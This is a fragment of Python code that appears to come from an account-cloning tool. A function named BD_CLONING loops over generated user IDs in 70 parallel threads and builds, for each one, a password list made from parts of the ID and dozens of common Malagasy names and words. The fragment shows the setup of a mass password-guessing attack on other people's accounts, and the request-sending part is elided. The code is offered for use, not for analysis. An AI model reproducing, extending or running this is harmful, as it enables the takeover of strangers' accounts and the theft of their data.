...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'koloina','malala','felana','sarika','mahery','mamako','fitiavana','papako','nomena','nirina','zanako','tantely','harena','valisoa','tahiry','fanilo','faniry','anjarako','fitiavako','malalako','nilaina','narovana','safidy','mahefa','jesosy','milely','nekena','valimbavaka','vadiko','mahandry','sarobidy','fanomezana','sarika','Sarika','malala','Malala','papako','Papako','mamako','Mamako','valimbavaka','Valimbavaka','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra']
